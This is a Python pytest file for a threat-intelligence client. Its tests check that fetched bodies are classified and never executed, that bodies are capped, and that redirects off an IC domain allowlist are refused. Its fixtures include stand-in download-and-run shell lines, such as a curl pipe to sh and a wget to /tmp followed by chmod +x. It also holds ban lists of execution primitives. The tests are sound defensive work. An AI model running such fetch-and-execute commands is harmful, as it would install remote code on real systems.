"""Guardrail 2: fetched bodies are data.

They are stored verbatim and pattern-matched. Nothing is executed or rendered, and nothing
is followed off the IC domain allowlist.
"""

import ast
import os
import subprocess
from pathlib import Path

import httpx
import pytest

from icp_threat_intel.core.bodies import BodyClass, classify_body, is_ic_domain
from icp_threat_intel.core.http import MAX_BODY_BYTES, HostNotAllowed
from tests.guardrails._support import imported_modules, make_client, source_files

GATEWAY = "https://tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io/"
BANNED_IMPORTS = {"subprocess", "webbrowser", "pickle", "marshal", "shelve", "pty", "runpy"}
BANNED_CALLS = {"eval", "exec", "compile", "__import__"}
BANNED_OS_ATTRS = {"system", "popen", "execv", "execve", "execvp", "spawnv", "spawnl", "startfile"}


@pytest.mark.parametrize(
    ("body", "expected"),
    [
        (b"https://payload.example/stage2.bin\n", BodyClass.URL),
        (b"aHR0cHM6Ly9wYXlsb2FkLmV4YW1wbGUvc3RhZ2UyLmJpbg==", BodyClass.BASE64_BLOB),
        (b"curl -fsSL https://payload.example/x | sh", BodyClass.SHELL_FRAGMENT),
        (
            b"#!/bin/sh\nwget -qO /tmp/pglog https://x.example/a && chmod +x /tmp/pglog",
            BodyClass.SHELL_FRAGMENT,
        ),
        (b"", BodyClass.EMPTY),
        (b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00", BodyClass.BINARY),
        (b"<!doctype html><html><body>hello</body></html>", BodyClass.OTHER),
    ],
)
def test_classification(body: bytes, expected: BodyClass) -> None:
    assert classify_body(body) is expected


def test_classifying_never_executes(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    def _boom(*_args: object, **_kwargs: object) -> None:
        raise AssertionError("body was executed")

    monkeypatch.setattr(subprocess, "Popen", _boom)
    monkeypatch.setattr(os, "system", _boom)
    marker = tmp_path / "pwned"
    bodies = [
        f"touch {marker}".encode(),
        f"import pathlib; pathlib.Path({str(marker)!r}).write_text('x')".encode(),
        f"<script>fetch('{GATEWAY}')</script>".encode(),
    ]
    for body in bodies:
        classify_body(body)
    assert not marker.exists()


def test_body_is_returned_verbatim() -> None:
    raw = b"\xff\xfe not utf-8 \x00\r\n<script>alert(1)</script>"
    client, _ = make_client(lambda _r: httpx.Response(200, content=raw))
    response = client.get(GATEWAY, ic_domains_only=True)
    assert response.body == raw
    assert response.truncated is False


def test_body_is_capped() -> None:
    big = b"A" * (MAX_BODY_BYTES * 2)
    client, _ = make_client(lambda _r: httpx.Response(200, content=big))
    response = client.get(GATEWAY, ic_domains_only=True)
    assert response.truncated is True
    assert len(response.body) == MAX_BODY_BYTES == 1024 * 1024


def test_timeout_is_ten_seconds() -> None:
    client, _ = make_client(lambda _r: httpx.Response(200))
    assert client.timeout_seconds == 10.0


@pytest.mark.parametrize(
    "location",
    [
        "https://evil.example/payload",
        "https://pypi.org/simple/",
        "http://cjn37-uyaaa-aaaac-qgnva-cai.raw.icp0.io/",
    ],
)
def test_gateway_redirect_off_ic_domains_is_refused(location: str) -> None:
    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.host.endswith("icp0.io") and request.url.scheme == "https":
            return httpx.Response(302, headers={"Location": location})
        return httpx.Response(200, content=b"should never be fetched")

    client, recorder = make_client(handler)
    with pytest.raises(HostNotAllowed):
        client.get(GATEWAY, ic_domains_only=True)
    assert len(recorder.requests) == 1


def test_gateway_redirect_within_ic_domains_is_followed() -> None:
    target = "https://cjn37-uyaaa-aaaac-qgnva-cai.raw.icp0.io/x"

    def handler(request: httpx.Request) -> httpx.Response:
        if str(request.url) == GATEWAY:
            return httpx.Response(302, headers={"Location": target})
        return httpx.Response(200, content=b"ok")

    client, recorder = make_client(handler)
    response = client.get(GATEWAY, ic_domains_only=True)
    assert response.body == b"ok"
    assert response.url == target
    assert len(recorder.requests) == 2


@pytest.mark.parametrize(
    ("host", "expected"),
    [
        ("x.raw.icp0.io", True),
        ("x.ic0.app", True),
        ("icp-api.io", True),
        ("pypi.org", False),
        ("icp0.io.evil", False),
    ],
)
def test_ic_domain_check(host: str, expected: bool) -> None:
    assert is_ic_domain(host) is expected


def test_no_execution_primitives_in_source() -> None:
    offenders: list[str] = []
    for path in source_files():
        banned = BANNED_IMPORTS & imported_modules(path)
        if banned:
            offenders.append(f"{path}: imports {sorted(banned)}")
        for node in ast.walk(ast.parse(path.read_text(encoding="utf-8"))):
            if (
                isinstance(node, ast.Call)
                and isinstance(node.func, ast.Name)
                and node.func.id in BANNED_CALLS
            ):
                offenders.append(f"{path}:{node.lineno}: {node.func.id}()")
            if (
                isinstance(node, ast.Attribute)
                and node.attr in BANNED_OS_ATTRS
                and isinstance(node.value, ast.Name)
                and node.value.id == "os"
            ):
                offenders.append(f"{path}:{node.lineno}: os.{node.attr}")
    assert offenders == []
